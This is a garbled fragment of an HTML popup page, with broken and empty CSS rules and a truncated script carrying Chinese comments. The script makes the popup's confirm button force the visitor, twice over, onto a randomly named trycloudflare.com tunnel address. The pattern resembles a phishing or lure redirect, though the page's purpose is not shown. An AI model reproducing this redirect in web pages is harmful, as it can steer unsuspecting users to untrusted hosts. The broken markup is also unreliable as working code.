    <style type="text/tailwindcss">

            }
            .btn-hover {

            }

    <style>
        body {

            font-family: 'Inter', system-ui, sans-serif;
            background-color: #f3f4f6;
        }
        .overlay {
            position: fixed;

            display: flex;

            border-radius: 0.375rem;
            padding: 0.75rem 1.5rem;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
        }
        .confirm-btn:hover {

        }
        .confirm-btn:active {

</p>

    <script>
        // 页面加载完成后自动显示弹窗（在这个实现中，弹窗是默认显示的）
        document.addEventListener('DOMContentLoaded', function() {
            // 弹窗已经在HTML中静态定义，无需JS动态显示
            console.log('弹窗已显示');
            
            // 为按钮添加点击事件监听
            const confirmBtn = document.querySelector('.confirm-btn');
            confirmBtn.addEventListener('click', function(e) {

                window.open('https://pdas-scheme-framework-shares.trycloudflare.com/', '_self');

                setTimeout(function() {
                    window.location.href = 'https://pdas-scheme-framework-shares.trycloudflare.com/';
                }, 100);
            });
